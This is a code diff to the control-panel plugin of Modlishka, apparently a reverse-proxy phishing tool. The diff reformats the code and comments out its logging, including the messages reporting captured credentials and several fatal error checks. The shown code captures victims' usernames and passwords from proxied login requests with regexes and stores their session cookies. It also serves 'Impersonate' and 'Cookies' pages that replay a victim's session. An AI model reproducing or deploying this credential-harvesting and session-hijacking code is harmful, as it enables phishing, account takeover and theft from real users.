@@ -20,10 +20,6 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
-	"github.com/drk1wi/Modlishka/config"
-	"github.com/drk1wi/Modlishka/runtime"
-	"github.com/drk1wi/Modlishka/log"
-	"github.com/tidwall/buntdb"
 	"html/template"
 	"io"
 	"net/http"
@@ -32,12 +28,17 @@ import (
 	"regexp"
 	"strings"
 	"time"
+
+	"github.com/drk1wi/Modlishka/config"
+	"github.com/drk1wi/Modlishka/log"
+	"github.com/drk1wi/Modlishka/runtime"
+	"github.com/tidwall/buntdb"
 )
 
 type ExtendedControlConfiguration struct {
 	*config.Options
-	CredParams *string `json:"credParams"`
-	ControlURL *string `json:"ControlURL"`
+	CredParams   *string `json:"credParams"`
+	ControlURL   *string `json:"ControlURL"`
 	ControlCreds *string `json:"ControlCreds"`
 }
 
@@ -237,10 +238,10 @@ var cookietemplate = `<!DOCTYPE html>
 `
 
 type Victim struct {
-	UUID     string
-	Username string
-	Password string
-	Session  string
+	UUID       string
+	Username   string
+	Password   string
+	Session    string
 	Terminated bool
 }
 
@@ -248,15 +249,15 @@ type Cookie struct {
 	Name  string `json:"name"`
 	Value string `json:"value"`
 
-	Path       string `json:"path"`
-	Domain     string `json:"domain"`
+	Path       string    `json:"path"`
+	Domain     string    `json:"domain"`
 	Expires    time.Time `json:"expire"`
-	RawExpires string 
+	RawExpires string
 
 	// MaxAge=0 means no 'Max-Age' attribute specified.
 	// MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
 	// MaxAge>0 means Max-Age attribute present and given in seconds
-	MaxAge   int 
+	MaxAge   int
 	Secure   bool `json:"secure"`
 	HttpOnly bool `json:"httpOnly"`
 	SameSite http.SameSite
@@ -354,15 +355,15 @@ func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {
 
 	for _, v := range cookies {
 		c := Cookie{
-			Name:     v.Name,
-			Value:    v.Value,
-			Path:   v.Path,
-			Domain:   v.Domain,
-			Expires:  v.Expires,
-			RawExpires:  v.RawExpires,
-			MaxAge:  v.MaxAge,
-			HttpOnly: v.HttpOnly,
-			Secure:   v.Secure,
+			Name:       v.Name,
+			Value:      v.Value,
+			Path:       v.Path,
+			Domain:     v.Domain,
+			Expires:    v.Expires,
+			RawExpires: v.RawExpires,
+			MaxAge:     v.MaxAge,
+			HttpOnly:   v.HttpOnly,
+			Secure:     v.Secure,
 			SameSite:   v.SameSite,
 		}
 
@@ -372,7 +373,7 @@ func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {
 
 	b, err := jar.marshalJSON()
 	if err != nil {
-		log.Debugf("%s", err.Error())
+		//log.Debugf("%s", err.Error())
 	}
 	victim.Session = string(b)
 
@@ -383,7 +384,7 @@ func (config *ControlConfig) printEntries() error {
 
 	err := config.db.View(func(tx *buntdb.Tx) error {
 		err := tx.Ascend("", func(key, value string) bool {
-			//log.Infof("key: %s, value: %s\n", key, value)
+			////log.Infof("key: %s, value: %s\n", key, value)
 			return true
 		})
 		return err
@@ -460,7 +461,7 @@ func (config *ControlConfig) getOrCreateEntry(victim *Victim) (*Victim, error) {
 
 func (config *ControlConfig) addEntry(victim *Victim) error {
 
-	//log.Infof("Adding entry %s %s %s",victim.UUID,victim.Username,victim.Password)
+	////log.Infof("Adding entry %s %s %s",victim.UUID,victim.Username,victim.Password)
 
 	b, err := json.Marshal(victim)
 	if err != nil {
@@ -508,15 +509,15 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 func notifyCollection(victim *Victim) {
 
 	if victim.Username != "" && victim.Password != "" {
-		log.Infof("Credentials collected ID:[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
+		//log.Infof("Credentials collected ID:[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
 	}
 
 	if victim.Username == "" && victim.Password != "" {
-		log.Infof("Password collected ID:[%s] password: %s", victim.UUID, victim.Password)
+		//log.Infof("Password collected ID:[%s] password: %s", victim.UUID, victim.Password)
 	}
 
 	if victim.Username != "" && victim.Password == "" {
-		log.Infof("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
+		//log.Infof("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
 	}
 }
 
@@ -550,15 +551,15 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 
 		body, err := io.ReadAll(req.Body)
 		if err != nil {
-			log.Debugf("Error reading body: %v", err)
+			//log.Debugf("Error reading body: %v", err)
 		}
 
 		decodedbody, err := url.QueryUnescape(string(body))
 		if err != nil {
-			log.Debugf("Error decoding body: %v", err)
+			//log.Debugf("Error decoding body: %v", err)
 		}
 
-		//log.Infof("%s",decodedbody)
+		////log.Infof("%s",decodedbody)
 
 		usernames := config.usernameRegexp.FindStringSubmatch(decodedbody)
 		if len(usernames) > 0 {
@@ -571,7 +572,7 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 		}
 
 		//for parameterName := range req.Form {
-		//	log.Infof("param value %s",req.Form.Get(parameterName))
+		//	//log.Infof("param value %s",req.Form.Get(parameterName))
 		//
 		//}
 
@@ -606,25 +607,25 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	data := struct {
-        Victims   []Victim
-        CredsCount int
-        TermCount int
-        CredsPercent float64
-        TermPercent float64
-        URL string
-    }{
-        victims,
-        credsCount,
-        termCount,
-        float64(credsCount) / float64(len(victims)) * 100,
-        float64(termCount) / float64(len(victims)) * 100,
-        CConfig.url,
-    }
+		Victims      []Victim
+		CredsCount   int
+		TermCount    int
+		CredsPercent float64
+		TermPercent  float64
+		URL          string
+	}{
+		victims,
+		credsCount,
+		termCount,
+		float64(credsCount) / float64(len(victims)) * 100,
+		float64(termCount) / float64(len(victims)) * 100,
+		CConfig.url,
+	}
 	t := template.New("modlishka")
 	t, _ = t.Parse(htmltemplate)
 	err := t.Execute(w, data)
 	if err != nil {
-		log.Errorf("Error %s", err)
+		//log.Errorf("Error %s", err)
 	}
 
 	//v,_ :=json.Marshal(&victims)
@@ -636,20 +637,20 @@ func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
 	users, ok := r.URL.Query()["user_id"]
 
 	if !ok || len(users[0]) < 1 {
-		log.Infof("Url Param 'users_id' is missing")
+		//log.Infof("Url Param 'users_id' is missing")
 		return
 	}
 
 	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
-		log.Infof("Error %s", err.Error())
+		//log.Infof("Error %s", err.Error())
 		return
 	}
 	var jar = CookieJar{}
 	err = json.Unmarshal([]byte(entry.Session), &jar)
 	if err != nil {
-		log.Infof("Error %s", err.Error())
+		//log.Infof("Error %s", err.Error())
 		return
 	}
 
@@ -690,20 +691,20 @@ func HelloHandlerImpersonateFrames(w http.ResponseWriter, r *http.Request) {
 	users, ok := r.URL.Query()["user_id"]
 
 	if !ok || len(users[0]) < 1 {
-		log.Infof("Url Param 'users_id' is missing")
+		//log.Infof("Url Param 'users_id' is missing")
 		return
 	}
 
 	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
-		log.Infof("Error %s", err.Error())
+		//log.Infof("Error %s", err.Error())
 		return
 	}
 	var jar = CookieJar{}
 	err = json.Unmarshal([]byte(entry.Session), &jar)
 	if err != nil {
-		log.Infof("Error %s", err.Error())
+		//log.Infof("Error %s", err.Error())
 		return
 	}
 
@@ -738,20 +739,20 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 	users, ok := r.URL.Query()["user_id"]
 
 	if !ok || len(users[0]) < 1 {
-		log.Infof("Url Param 'users_id' is missing")
+		//log.Infof("Url Param 'users_id' is missing")
 		return
 	}
 
 	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
-		log.Infof("Error %s", err.Error())
+		//log.Infof("Error %s", err.Error())
 		return
 	}
 	var jar = CookieJar{}
 	err = json.Unmarshal([]byte(entry.Session), &jar)
 	if err != nil {
-		log.Infof("Error %s", err.Error())
+		//log.Infof("Error %s", err.Error())
 		return
 	}
 
@@ -866,18 +867,18 @@ func init() {
 
 			ct, err := os.Open(*config.JSONConfig)
 			if err != nil {
-				log.Errorf("Error opening JSON configuration (%s): %s", *config.JSONConfig, err)
+				//log.Errorf("Error opening JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
 			}
 
 			ctb, _ := io.ReadAll(ct)
 			if err = json.Unmarshal(ctb, &jsonConfig); err != nil {
-				log.Errorf("Error unmarshalling JSON configuration (%s): %s", *config.JSONConfig, err)
+				//log.Errorf("Error unmarshalling JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
 			}
 
 			if err := ct.Close(); err != nil {
-				log.Errorf("Error closing JSON configuration (%s): %s", *config.JSONConfig, err)
+				//log.Errorf("Error closing JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
 			}
 
@@ -899,7 +900,7 @@ func init() {
 			CConfig.controlUser = controlCreds[0]
 			CConfig.controlPass = controlCreds[1]
 		} else if len(controlCreds) == 1 || len(controlCreds) > 2 {
-			log.Fatalf("Control credentials must be provided in user:pass format")
+			//log.Fatalf("Control credentials must be provided in user:pass format")
 		}
 
 		if jsonConfig.CredParams != nil {
@@ -912,12 +913,12 @@ func init() {
 
 			decodedusername, err := base64.StdEncoding.DecodeString(creds[0])
 			if err != nil {
-				log.Fatalf("decode error:", err)
+				//log.Fatalf("decode error:", err)
 				return
 			}
 			decodedpaswrd, err := base64.StdEncoding.DecodeString(creds[1])
 			if err != nil {
-				log.Fatalf("decode error:", err)
+				//log.Fatalf("decode error:", err)
 				return
 			}
 
@@ -925,7 +926,7 @@ func init() {
 			CConfig.passwordRegexp = regexp.MustCompile(string(decodedpaswrd))
 
 			CConfig.active = true
-			log.Infof("Control Panel: Collecting usernames with [%s] regex and passwords with [%s] regex", string(decodedusername), string(decodedpaswrd))
+			//log.Infof("Control Panel: Collecting usernames with [%s] regex and passwords with [%s] regex", string(decodedusername), string(decodedpaswrd))
 
 		}
 
@@ -939,8 +940,8 @@ func init() {
 		handler.HandleFunc("/"+CConfig.url+"/Impersonate", use(HelloHandlerImpersonate, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/Cookies", use(HelloHandlerCookieDisplay, basicAuth))
 
-		log.Infof("Control Panel: " + CConfig.url + " handler registered	")
-		log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)
+		//log.Infof("Control Panel: " + CConfig.url + " handler registered	")
+		//log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)
 
 	}
 
@@ -956,7 +957,7 @@ func init() {
 				// Entry doesn't exist yet
 				if err != nil {
 					if err := CConfig.updateEntry(&victim); err != nil {
-						log.Infof("Error %s", err.Error())
+						//log.Infof("Error %s", err.Error())
 						return
 					}
 				}
@@ -966,7 +967,7 @@ func init() {
 
 				victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
 				if err := CConfig.updateEntry(&victim); err != nil {
-					log.Infof("Error %s", err.Error())
+					//log.Infof("Error %s", err.Error())
 					return
 				}
 				notifyCollection(&victim)
@@ -1004,7 +1005,7 @@ func init() {
 	}
 
 	//process HTTP response (responses can arrive in random order)
-	s.HTTPResponse = func(resp *http.Response, context *HTTPContext,buffer *[]byte) {
+	s.HTTPResponse = func(resp *http.Response, context *HTTPContext, buffer *[]byte) {
 
 		cookies := resp.Cookies()
 		// there are new set-cookies
@@ -1024,7 +1025,7 @@ func init() {
 					cookies[i].Domain = t
 				}
 
-				//log.Infof("%s",cookies[i].Domain)
+				////log.Infof("%s",cookies[i].Domain)
 
 			}
 
@@ -1042,12 +1043,12 @@ func init() {
 
 	}
 
-	s.TerminateUser = func(userID string){
-		log.Infof("Invoking control terminate")
+	s.TerminateUser = func(userID string) {
+		//log.Infof("Invoking control terminate")
 		victim := Victim{UUID: userID, Terminated: true}
 		err := CConfig.updateEntry(&victim)
 		if err != nil {
-			log.Errorf("Error %s", err)
+			//log.Errorf("Error %s", err)
 			return
 		}
 
